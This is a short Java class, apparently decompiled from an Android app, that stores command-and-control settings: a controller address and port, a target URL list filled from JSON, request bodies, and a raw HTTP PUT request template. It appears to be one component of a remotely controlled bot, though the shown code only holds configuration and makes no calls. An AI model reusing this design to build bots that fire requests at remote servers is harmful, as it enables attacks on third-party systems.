package com.example.ripapp2;

import java.util.ArrayList;
import java.util.Arrays;
import org.json.JSONArray;
import org.json.JSONException;

public class ConfigC2 {
    public static String addr;
    public static MyApp app;
    public static ArrayList<String> body = new ArrayList<>();
    public static ArrayList<String> head = new ArrayList<>(Arrays.asList(new String[]{"PUT ", " HTTP/1.1\r\nHost: ", "\r\nConnection: close\r\n\r\n"}));
    public static String port;
    public static ArrayList<String> urllist = new ArrayList<>();

    public static void setUrllist(JSONArray jSONArray) {
        int i = 0;
        while (i < jSONArray.length()) {
            try {
                urllist.add(jSONArray.getString(i));
                i++;
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public static void setBody(JSONArray jSONArray) {
        int i = 0;
        while (i < jSONArray.length()) {
            try {
                body.add(jSONArray.getString(i));
                i++;
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        }
    }
}
